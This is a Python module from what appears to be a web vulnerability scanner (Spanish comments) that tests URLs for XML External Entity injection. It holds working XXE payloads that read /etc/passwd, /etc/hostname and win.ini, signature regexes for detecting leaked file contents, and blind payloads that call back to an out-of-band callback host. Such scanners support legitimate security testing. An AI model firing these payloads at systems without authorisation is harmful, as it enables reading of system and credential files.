import contextlib
import re
from typing import Any, Optional
from urllib.parse import urljoin, urlparse

import requests

XXE_PAYLOADS = [
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><data>&xxe;</data></root>""",
    """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><item>&xxe;</item></root>""",
    """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >
]>
<foo>&xxe;</foo>""",
]

XXE_SIGNATURES = [
    r"root:[x*]?:0:0:",
    r"\[fonts\]",
    r"\[extensions\]",
    r"for 16-bit app support",
]

XML_CONTENT_TYPES = {"application/xml", "text/xml", "application/soap+xml"}

XML_ENDPOINT_PATTERNS = ["/xml", "/soap", "/api/xml", "/wsdl", "/.xml"]


def check_xxe(
    url: str,
    html_content: str = "",
    session: Optional[requests.Session] = None,
    oast_client: Optional[Any] = None,
) -> list[dict[str, str]]:
    results: list[dict[str, str]] = []
    client = session if session is not None else requests

    urlparse(url)

    targets = []
    form_actions = re.findall(r'<form[^>]+action="([^"]+)"', html_content, re.IGNORECASE)
    for action in form_actions:
        resolved = urljoin(url, action)
        targets.append(resolved)

    for pattern in XML_ENDPOINT_PATTERNS:
        candidate = urljoin(url, pattern)
        try:
            r = client.get(candidate, timeout=4)
            if r.status_code < 500:
                targets.append(candidate)
        except requests.RequestException:
            pass

    targets.append(url)

    seen = set()
    for target in targets:
        if target in seen:
            continue
        seen.add(target)

        # 1. Pruebas in-band (búsqueda de firmas de archivos en la respuesta)
        for payload in XXE_PAYLOADS:
            baseline = ""
            try:
                r = client.get(target, timeout=5)
                baseline = r.text
            except requests.RequestException:
                pass

            for content_type in XML_CONTENT_TYPES:
                headers = {"Content-Type": content_type}
                try:
                    r = client.post(target, data=payload, headers=headers, timeout=6)
                    diff = r.text.replace(baseline, "")

                    for sig in XXE_SIGNATURES:
                        if re.search(sig, diff, re.IGNORECASE) and not re.search(sig, baseline, re.IGNORECASE):
                            results.append({
                                "vuln": "XML External Entity Injection (XXE)",
                                "risk": "Alto",
                                "detail": f"Posible XXE en '{target}' con Content-Type '{content_type}'. Se detecto contenido del sistema en la respuesta: '{sig}'",
                                "confidence": "confirmed",
                            })
                            return results

                except requests.RequestException:
                    continue

        # 2. Pruebas Fuera de Banda (Blind XXE vía OAST)
        if oast_client is not None:
            token = oast_client.generate_token(prefix="xxe")
            cb_url = oast_client.get_callback_url(token)
            blind_payloads = [
                f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}">%ext;]><root><test>1</test></root>',
                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb_url}"><foo>&xxe;</foo>',
            ]
            for b_payload in blind_payloads:
                for content_type in XML_CONTENT_TYPES:
                    with contextlib.suppress(requests.RequestException):
                        client.post(target, data=b_payload, headers={"Content-Type": content_type}, timeout=5)
            interactions = oast_client.poll_interactions(token)
            if interactions:
                results.append({
                    "vuln": "Blind XML External Entity Injection (Blind XXE - OAST)",
                    "risk": "Critico",
                    "detail": (
                        f"Vulnerabilidad Blind XXE confirmada en '{target}'. El procesador XML del servidor resolvió "
                        f"una entidad externa y conectó al servidor OAST (interacciones recibidas: {len(interactions)})."
                    ),
                    "confidence": "confirmed",
                })
                return results

    return results
